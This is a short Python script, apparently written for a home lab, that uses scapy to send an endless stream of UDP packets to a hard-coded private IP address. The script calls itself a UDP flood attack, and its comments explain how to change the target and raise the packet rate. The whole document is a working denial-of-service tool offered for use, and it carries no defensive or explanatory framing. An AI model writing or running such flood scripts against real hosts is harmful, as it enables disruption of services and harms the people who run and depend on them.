from scapy.all import *
import time

target_ip = "192.168.254.107"  # Replace with your Windows machine's IP
target_port = 80  # Change to any open UDP port

print(f"Starting UDP flood attack on {target_ip}:{target_port}...")

while True:
    send(IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="Flood"), verbose=False)
    time.sleep(0.01)  # Adjust rate (lower = faster attack)
